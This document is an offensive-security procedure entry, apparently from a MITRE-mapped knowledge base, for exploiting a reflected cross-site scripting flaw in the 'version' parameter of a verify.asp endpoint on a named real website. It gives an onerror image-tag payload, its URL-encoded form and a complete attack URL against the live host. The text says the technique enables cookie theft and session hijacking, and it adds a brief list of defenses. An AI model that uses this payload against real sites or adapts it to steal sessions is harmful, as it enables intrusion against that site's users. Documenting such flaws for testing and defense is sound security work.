---
id: proc-xss-inject-001
tags:
  - xss
  - payload-injection
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.726Z'
skill_level: beginner
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Malicious Payload for XSS Execution

## Summary

This procedure crafts and injects a URL-encoded JavaScript payload into the vulnerable 'version' parameter to execute arbitrary code in the browser, demonstrating the full impact of the reflected XSS.

## Description

Building on the identified vulnerability in the Acronis verify.asp endpoint, this procedure uses a proof-of-concept payload that leverages an onerror event on a broken image tag to trigger an alert. The payload is URL-encoded to bypass basic filters and injected after closing the expected parameter value. Successful execution confirms the ability to run scripts in the user's session, enabling attacks like cookie theft.

## Requirements

1. Confirmed vulnerable endpoint from prior identification
2. URL encoder (browser console or online tool)
3. Web browser to load the crafted URL

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all query parameters server-side
- Employ Web Application Firewalls (WAF) to block common XSS payloads
- Log and alert on anomalous JavaScript execution attempts via browser monitoring

## Objectives

1. Deliver and execute JavaScript in the victim browser
2. Demonstrate potential for session hijacking
3. Validate exploit reliability across browsers

## Instructions

### Step 1: Craft the Payload

**Context**: Create a simple JavaScript payload that executes on error, then URL-encode it.

Payload: <img src=v onerror=alert(document.domain)>

URL-Encoded: %3Cimg%20src=v%20onerror=alert(document.domain)%3E

> This payload uses a non-existent image source 'v' to trigger the onerror event, alerting the domain.

### Step 2: Inject into the Endpoint

**Context**: Append the encoded payload to close the string and inject HTML.

Full URL: http://www.grouplogic.com/files/glidownload/verify.asp?version=AC12'%3E%3Cimg%20src=v%20onerror=alert(document.domain)%3E

Load the URL in a browser.

> Expected output: An alert box displays the document domain (e.g., www.grouplogic.com), confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
